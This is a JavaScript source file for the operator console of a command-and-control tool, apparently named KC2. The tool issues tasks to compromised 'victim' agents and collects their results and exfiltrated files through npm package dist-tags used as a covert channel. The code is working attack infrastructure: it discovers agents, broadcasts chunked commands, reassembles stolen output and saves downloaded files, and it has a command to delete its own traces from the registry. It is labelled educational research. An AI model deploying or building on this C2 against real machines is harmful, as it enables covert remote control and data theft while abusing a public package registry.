// Attacker CLI: interactive REPL that issues commands and collects results
// exclusively through npm dist-tags. It never talks to a victim directly.
//
// While the prompt is idle, a background poller keeps running and prints
// live notifications: agents discovered (announce tags) and tasks completing
// or failing (result tags).
//
// Commands:
//   agents                      list historically discovered agents
//   task <agentId|all> <op> [args...]   task one known agent or broadcast to all
//                         (op allowlist: src/common/ops.js)
//   chain list|add|delete|run   named task sequences (chains.json)
//   history [n]                 show the last n requests/responses (default 20)
//   poll                        fetch results or show locally pending direct tasks
//   clean                       delete all lab tags (x-cmd-*/x-res-*/x-ann-*)
//   stats                       local counters: commands sent, results received
//   help                        show help
//   exit                        save state and quit

import readline from 'node:readline/promises';
import { clearScreenDown, cursorTo, moveCursor } from 'node:readline';
import path from 'node:path';
import { taskTtlMs, loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  MAX_TAG_LEN,
  decodeAnnounceTag,
  decodeCommandHeader,
  decodeResultTag,
  encodeCommandTags,
  isAnnounceTag,
  isCommandTag,
  isLabTag,
  isResultTag,
  reassembleResult,
} from '../common/protocol.js';
import { OP_DEFS, parseOpArgs } from '../common/ops.js';
import { RegistryClient } from '../common/registry.js';
import { saveState } from '../victim/agent.js';
import {
  assertKnownAgent,
  loadAttackerState,
  renameAgent,
  resolveAgentReference,
} from './state.js';
import {
  createSingleFlight,
  formatLiveNotification,
  formatResultBody,
  inputBlockGeometry,
  pendingDirectTasks,
  sanitizeRegistryText,
} from './text.js';
import {
  createPalette,
  HISTORY_OUTPUT_MAX,
  PROMPT_TEXT,
  pushHistory,
  saveDownload,
  timestamp,
} from './cli-display.js';

// Re-exported so existing imports from this module keep working.
export {
  createSingleFlight,
  formatLiveNotification,
  inputBlockGeometry,
  pendingDirectTasks,
  sanitizeRegistryText,
} from './text.js';
import {
  assertValidName,
  deleteChain,
  loadChains,
  migrateLegacyPlaybooks,
  parseChainFlags,
  saveChains,
  setChain,
  tokenize,
} from './chains.js';
import { createCommands } from './cli-commands.js';

const tty = process.stdout.isTTY;
const { color: c, section, cmdName, gold, dim } = createPalette(tty);

// ---------------------------------------------------------------------------

function parseTaskLine(line) {
  const tokens = tokenize(line);
  const [, target, op, ...rest] = tokens;
  if (!target || !op) {
    throw new Error('usage: task <agentId|all> <op> [args...]');
  }
  return { target, op, args: parseOpArgs(op, rest) };
}

export async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: cfg.logLevel,
    logFile: cfg.logFile,
    console: false, // keep REPL output clean; log lines go to the file only
  });
  const statePath = path.resolve(cfg.stateFile || 'attacker-state.json');
  let state = loadAttackerState(statePath);
  const save = () => saveState(statePath, state);
  const ttlMs = taskTtlMs(cfg.pollIntervalSec);

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    timeoutMs: cfg.requestTimeoutMs,
    maxRetries: cfg.maxRetries,
    baseDelayMs: cfg.retryBaseDelayMs,
    logger,
  });

  console.log(c(['bold', 'cyan'], 'KC2 attacker CLI (educational research only)'));
  console.log(`${dim('registry:')} ${cfg.registryUrl}  ${dim('package:')} ${cfg.packageName}`);
  if (!cfg.token) {
    console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
  }
  console.log(`${dim('state:')}    ${statePath} ${dim(`(history: ${state.history.length} entries)`)}`);
  console.log(`type ${cmdName('help')} for commands`);

  // --- REPL (created before the poller so notifications can redraw the prompt)

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: c('blue', PROMPT_TEXT),
  });
  let currentPromptText = PROMPT_TEXT;
  let attachedAgentId;

  function setPrompt(text) {
    currentPromptText = text;
    rl.setPrompt(c('blue', currentPromptText));
  }

  /** Print a live notification without mangling the line the user is typing. */
  function notify(line, redraw = true) {
    if (redraw && tty && !rlClosed) {
      // Erase the WHOLE input block, not just the cursor row: a long
      // command wraps onto several rows, and clearing only the cursor row
      // (the old behavior) left stray kc2> fragments inside the input.
      const { cursorRow } = inputBlockGeometry(rl.line.length, rl.cursor ?? rl.line.length, {
        promptWidth: currentPromptText.length,
        columns: process.stdout.columns,
      });
      cursorTo(process.stdout, 0);
      if (cursorRow > 0) moveCursor(process.stdout, 0, -cursorRow);
      clearScreenDown(process.stdout);
      console.log(line);
      rl.prompt(true);
      return;
    }
    console.log(formatLiveNotification(line, false));
    if (redraw && !rlClosed) rl.prompt(true);
  }

  // --- shared helpers -------------------------------------------------------

  function noteAgent(agentId, redraw = true) {
    if (state.agents.includes(agentId)) return;
    state.agents.push(agentId);
    notify(`[${timestamp()}] ${c('green', '[+] agent discovered:')} ${c('bold', agentId)}`, redraw);
  }

  function agentLabel(agentId) {
    const alias = state.agentAliases[agentId];
    return alias ? `${alias} (${agentId})` : agentId;
  }

  function printResult(agentId, r, redraw = true) {
    const op = sanitizeRegistryText(r.op ?? '?', 64);
    const output = sanitizeRegistryText(r.output);
    const error = sanitizeRegistryText(r.error);
    const head = `[${timestamp()}] ${c('magenta', agentLabel(agentId))} #${r.seq} ${op}`;
    if (!r.ok) {
      notify(`${head} ${c('red', 'FAILED')}:${formatResultBody(error)}`, redraw);
      return;
    }
    if (r.file && typeof r.file.dataB64 === 'string') {
      try {
        const out = saveDownload(agentId, r, cfg.downloadDir);
        notify(`${head} ${c('green', 'done')}:${formatResultBody(output)} -> saved to ${c('bold', out)}`, redraw);
      } catch (err) {
        notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`, redraw);
      }
      return;
    }
    notify(`${head} ${c('green', 'done')}:${formatResultBody(output)}`, redraw);
  }

  function recordResult(agentId, r) {
    pushHistory(state, {
      dir: 'in',
      ts: Date.now(),
      agentId,
      seq: r.seq,
      op: sanitizeRegistryText(r.op ?? '?', 64),
      ok: r.ok,
      output: sanitizeRegistryText(r.output, HISTORY_OUTPUT_MAX),
      error: sanitizeRegistryText(r.error, HISTORY_OUTPUT_MAX),
    });
  }

  let cleaning = false;
  // First time each incomplete result group was observed, so a result whose
  // chunks were lost in transit stops nagging once the task TTL has passed.
  const incompleteFirstSeen = new Map();

  function printPendingTasks() {
    const pending = pendingDirectTasks(state.history, {
      now: Date.now(),
      ttlMs,
    });
    for (const task of pending.slice(-5)) {
      const ageSec = Math.max(0, Math.floor((Date.now() - task.ts) / 1000));
      console.log(c('yellow', `pending: ${task.target} #${task.seq} ${task.op} (${ageSec}s)`));
    }
  }

  const refreshOnce = createSingleFlight(async ({ redraw = false } = {}) => {
    if (cleaning) throw new Error('registry cleanup is in progress');
    const tags = await client.getDistTags();
    if (cleaning) return { fresh: 0, incomplete: [] };
    const observedAt = Date.now();
    const groups = new Map(); // "<agentId>:<seq>" -> parts[]
    for (const name of Object.keys(tags)) {
      if (isCommandTag(name)) {
        try {
          const cmd = decodeCommandHeader(name);
          state.nextSeq[cmd.agentId] = Math.max(state.nextSeq[cmd.agentId] ?? 0, cmd.seq);
        } catch (err) {
          logger.warn(`skipping malformed command tag "${name}": ${err.message}`);
        }
        continue;
      }
      if (isAnnounceTag(name)) {
        try {
          const ann = decodeAnnounceTag(name);
          noteAgent(ann.agentId, redraw);
        } catch (err) {
          logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
        }
        continue;
      }
      if (!isResultTag(name)) continue;
      let part;
      try {
        part = decodeResultTag(name);
      } catch (err) {
        logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
        continue;
      }
      const key = `${part.agentId}:${part.seq}`;
      if (!groups.has(key)) groups.set(key, []);
      groups.get(key).push(part);
    }
    let fresh = 0;
    const incomplete = [];
    for (const [key, parts] of groups) {
      if (state.seenResults.includes(key)) continue;
      const total = parts[0].total;
      if (new Set(parts.map((p) => p.chunk)).size !== total) {
        const firstSeen = incompleteFirstSeen.get(key) ?? observedAt;
        incompleteFirstSeen.set(key, firstSeen);
        const have = new Set(parts.map((p) => p.chunk)).size;
        if (observedAt - firstSeen >= ttlMs) {
          incomplete.push(`${key}: result incomplete (${have}/${total} chunks) after the task TTL — giving up, result lost`);
          state.seenResults.push(key);
          incompleteFirstSeen.delete(key);
          continue;
        }
        incomplete.push(`${key}: waiting for chunks (${have}/${total})`);
        continue;
      }
      incompleteFirstSeen.delete(key);
      try {
        const result = reassembleResult(parts);
        const a = parts[0].agentId;
        noteAgent(a, redraw);
        printResult(a, result, redraw);
        recordResult(a, result);
        state.seenResults.push(key);
        state.received++;
        state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
        fresh++;
      } catch (err) {
        logger.warn(`failed to reassemble ${key}: ${err.message}`);
      }
    }
    for (const key of incompleteFirstSeen.keys()) {
      if (!groups.has(key)) incompleteFirstSeen.delete(key);
    }
    save();
    return { fresh, incomplete };
  });

  async function pollOnce({ quiet = false, redraw = false } = {}) {
    const { fresh, incomplete } = await refreshOnce({ redraw });
    if (!quiet) {
      for (const message of incomplete) notify(c('yellow', message), redraw);
      console.log(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
      if (fresh === 0) printPendingTasks();
    }
    return fresh;
  }

  async function sendTask(target, op, args) {
    const seq = Math.max(0, ...Object.values(state.nextSeq)) + 1;
    const sentAt = Date.now();
    const payload = { op, args, ts: sentAt };
    // Oversized payloads are split into <chunk>of<total> command tags;
    // victims buffer the parts and execute only once every chunk is visible.
    const tags = encodeCommandTags(target, seq, payload);
    for (const tag of tags) {
      await client.setDistTag(tag, PINNED_VERSION);
    }
    state.nextSeq[target] = seq;
    state.sent++;
    pushHistory(state, { dir: 'out', ts: sentAt, target, seq, op, args, tag: tags[0], chunks: tags.length });
    save();
    const detail =
      tags.length === 1
        ? `tag ${tags[0].length}/${MAX_TAG_LEN} chars`
        : `${tags.length} chunk tags of <=${MAX_TAG_LEN} chars`;
    console.log(`[${timestamp()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (${detail})`);
    console.log(c('dim', `  ${tags[0]}`));
    if (tags.length > 1) console.log(c('dim', `  … +${tags.length - 1} more chunk tag(s)`));
  }

  /** Dispatch an already validated task request through the normal safety checks. */
  async function dispatchTask({ target, op, args }) {
    try {
      await pollOnce({ quiet: true });
    } catch (err) {
      logger.warn(`agent discovery refresh failed before task: ${err.message}`);
    }

    if (target === 'all') {
      if (state.agents.length === 0) throw new Error('no known agents available; task not sent');
      await sendTask('all', op, args);
      return;
    }
    const agentId = resolveAgentReference(state, target);
    assertKnownAgent(state, agentId ?? target);
    await sendTask(agentId, op, args);
  }

  const commands = createCommands({
    colors: { c, section, cmdName, gold, dim },
    getState: () => state,
    setState: (nextState) => { state = nextState; },
    statePath, save, pollOnce, dispatchTask, parseTaskLine, agentLabel, setPrompt,
    getAttachedAgentId: () => attachedAgentId,
    setAttachedAgentId: (agentId) => { attachedAgentId = agentId; },
    client, setCleaning: (value) => { cleaning = value; },
  });

  // --- background poller: live notifications while the prompt is idle -------

  const notifyIntervalSec = Math.min(cfg.pollIntervalSec, 5);
  let rlClosed = false;
  const timer = setInterval(async () => {
    if (rlClosed) return;
    try {
      await pollOnce({ quiet: true, redraw: true });
    } catch (err) {
      notify(c('yellow', `[${timestamp()}] background poll failed: ${err.message}`));
    }
  }, notifyIntervalSec * 1000);
  timer.unref?.();
  console.log(c('dim', `live notifications on (polling every ${notifyIntervalSec}s)`));

  // --- REPL loop ------------------------------------------------------------

  rl.prompt();

  async function handleLine(line) {
    const trimmed = line.trim();
    const cmd = trimmed.split(/\s+/)[0];
    try {
      if (trimmed === '') {
        // ignore
      } else if (cmd === 'exit' || cmd === 'quit') {
        save();
        rl.close();
        return;
      } else if (cmd === 'watch') {
        console.log('watch is gone — live notifications already poll in the background');
      } else if (cmd === 'playbook') {
        console.log('playbook is now "chain" — see help; an existing playbooks.json migrates on first chain use');
      } else if (commands[cmd]) {
        await commands[cmd](trimmed);
      } else if (attachedAgentId && OP_DEFS.some((op) => op.name === cmd)) {
        await commands.task(`task ${attachedAgentId} ${line}`);
      } else if (attachedAgentId) {
        console.log(`unknown command "${cmd}" — type a KC2 task operation or "detach"`);
      } else {
        console.log(`unknown command "${cmd}" — type "help"`);
      }
    } catch (err) {
      console.log(c('red', `error: ${err.message}`));
      logger.error(`command "${cmd}" failed: ${err.message}`);
    }
    if (!rlClosed) rl.prompt();
  }

  // Serialize command handling so piped input cannot race (e.g. "exit"
  // killing the process before an earlier async command finishes printing).
  let queue = Promise.resolve();
  rl.on('line', (line) => {
    queue = queue.then(() => handleLine(line));
  });

  rl.on('close', () => {
    // Mark closed synchronously: piped input can fire 'close' while queued
    // async commands are still running, and they must not prompt a dead rl.
    rlClosed = true;
    queue.then(() => {
      clearInterval(timer);
      save();
      logger.close();
      console.log('bye');
      process.exit(0);
    });
  });
}
